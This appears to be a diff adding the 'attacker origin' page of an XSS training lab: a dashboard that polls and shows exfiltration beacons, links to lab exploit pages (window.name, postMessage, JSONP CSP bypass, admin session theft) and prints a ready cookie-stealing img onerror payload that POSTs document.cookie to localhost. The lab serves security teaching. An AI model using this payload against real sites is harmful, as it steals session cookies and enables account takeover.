@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Attacker Origin — XSS Labs</title>
+  <style>
+    :root {
+      --bg:#0d1117;--surface:#161b22;--surface-2:#1c2128;--border:#30363d;
+      --text:#e6edf3;--text-muted:#7d8590;--green:#3fb950;--red:#f85149;
+      --blue:#58a6ff;--orange:#ffa657;--yellow:#d29922;
+      --mono:'JetBrains Mono',Consolas,monospace;--sans:-apple-system,system-ui,sans-serif;
+    }
+    *{box-sizing:border-box;margin:0;padding:0;}
+    body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;min-height:100vh;}
+    a{color:var(--blue);}
+    nav{position:sticky;top:0;background:rgba(13,17,23,.92);border-bottom:1px solid var(--border);backdrop-filter:blur(8px);padding:0 20px;}
+    .nav-inner{max-width:1100px;margin:0 auto;display:flex;align-items:center;gap:16px;height:48px;}
+    .nav-logo{font-family:var(--mono);font-weight:700;color:var(--red);font-size:15px;text-decoration:none;}
+    .page{max-width:900px;margin:0 auto;padding:32px 20px;}
+    h1{font-size:24px;margin-bottom:8px;}
+    h2{font-size:16px;margin-bottom:12px;color:var(--text-muted);}
+    .panel{background:var(--surface);border:1px solid var(--border);border-radius:8px;margin-bottom:20px;}
+    .panel-header{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;}
+    .panel-title{font-weight:600;font-size:14px;}
+    .panel-body{padding:16px;}
+    .log-entry{font-family:var(--mono);font-size:12px;border-bottom:1px solid var(--border);padding:8px 0;word-break:break-all;}
+    .log-ts{color:var(--text-muted);}
+    .log-data{color:var(--green);margin-top:4px;}
+    .btn{padding:6px 14px;border-radius:6px;border:1px solid var(--border);cursor:pointer;font-size:13px;font-family:var(--sans);}
+    .btn-ghost{background:transparent;color:var(--text-muted);}
+    .btn-ghost:hover{border-color:var(--blue);color:var(--blue);}
+    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px;margin-top:16px;}
+    .exploit-card{background:var(--surface-2);border:1px solid var(--border);border-radius:6px;padding:12px;}
+    .exploit-card h3{font-size:13px;margin-bottom:6px;}
+    .exploit-card p{font-size:12px;color:var(--text-muted);margin-bottom:8px;}
+    .exploit-card a{font-size:12px;}
+    code{background:var(--surface-2);border:1px solid var(--border);border-radius:3px;padding:1px 5px;font-family:var(--mono);font-size:12px;color:var(--orange);}
+    #empty{color:var(--text-muted);font-size:13px;}
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">[ ATTACKER :3001 ]</a>
+    <span style="font-size:12px;color:var(--red);">Cross-site scripting exfil listener</span>
+  </div>
+</nav>
+
+<div class="page">
+
+  <div style="margin-bottom:32px;">
+    <div style="font-size:12px;color:var(--red);margin-bottom:4px;">http://localhost:3001</div>
+    <h1>Attacker Origin — Exfil Log</h1>
+    <p style="color:var(--text-muted);margin-top:4px;">Beacons received from XSS payloads executing in the victim's browser appear below. POST to <code>/log</code> from any XSS payload.</p>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header">
+      <span class="panel-title">&#127973; Exfil Log — <span id="log-count">0</span> entries</span>
+      <button class="btn btn-ghost" style="margin-left:auto;" onclick="loadLog()">Refresh</button>
+      <button class="btn btn-ghost" onclick="clearLog()">Clear</button>
+    </div>
+    <div class="panel-body">
+      <div id="log-container">
+        <div id="empty">No beacons received yet. Run an XSS payload that POSTs to http://localhost:3001/log</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">&#128296; Exploit Pages</span></div>
+    <div class="panel-body">
+      <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;">Pre-built exploit pages for labs that require cross-origin delivery:</p>
+      <div class="grid">
+        <div class="exploit-card"><h3>Lab 7 — Blind XSS</h3><p>Verify exfil beacons arrive after submitting a payload via the contact form.</p><a href="/lab7-verify.html">Open →</a></div>
+        <div class="exploit-card"><h3>Lab 10 — window.name</h3><p>Sets window.name to a payload and redirects to the victim page.</p><a href="/lab10.html">Open →</a></div>
+        <div class="exploit-card"><h3>Lab 11 — postMessage</h3><p>Iframes the victim and fires a postMessage payload.</p><a href="/lab11.html">Open →</a></div>
+        <div class="exploit-card"><h3>Lab 19 — JSONP</h3><p>JSONP endpoint for CSP bypass: <code>/lab19-jsonp?callback=fn</code></p><a href="/lab19-jsonp?callback=test">Test →</a></div>
+        <div class="exploit-card"><h3>Lab 20 — Capstone</h3><p>Exfil viewer for the admin session theft chain.</p><a href="/lab20-exfil.html">Open →</a></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">&#128203; Quick Exfil Payload</span></div>
+    <div class="panel-body">
+      <p style="font-size:13px;color:var(--text-muted);margin-bottom:10px;">Universal beacon payload — works from any XSS context:</p>
+      <pre style="background:var(--surface-2);border:1px solid var(--border);border-radius:6px;padding:12px;font-family:var(--mono);font-size:12px;overflow-x:auto;"><span style="color:#58a6ff;">&lt;img</span> <span style="color:#ffa657;">src=x</span> <span style="color:#ffa657;">onerror=</span><span style="color:#3fb950;">"fetch('http://localhost:3001/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,flag:typeof ADMIN_FLAG!='undefined'?ADMIN_FLAG:'',url:location.href})})"</span><span style="color:#58a6ff;">&gt;</span></pre>
+    </div>
+  </div>
+
+</div>
+
+<script>
+let logData = [];
+
+async function loadLog() {
+  const res = await fetch('/log');
+  logData = await res.json();
+  renderLog();
+}
+
+function renderLog() {
+  const el = document.getElementById('log-container');
+  document.getElementById('log-count').textContent = logData.length;
+  if (!logData.length) {
+    el.innerHTML = '<div id="empty">No beacons received yet. Run an XSS payload that POSTs to http://localhost:3001/log</div>';
+    return;
+  }
+  el.innerHTML = logData.map((e, i) => `
+    <div class="log-entry">
+      <div class="log-ts">#${logData.length - i} &mdash; ${e.ts || ''} &mdash; IP: ${e.ip || '?'}</div>
+      <div class="log-data">${JSON.stringify(e, null, 2).replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
+    </div>
+  `).join('');
+}
+
+function clearLog() {
+  logData = [];
+  renderLog();
+}
+
+loadLog();
+setInterval(loadLog, 5000);
+</script>
+</body>
+</html>
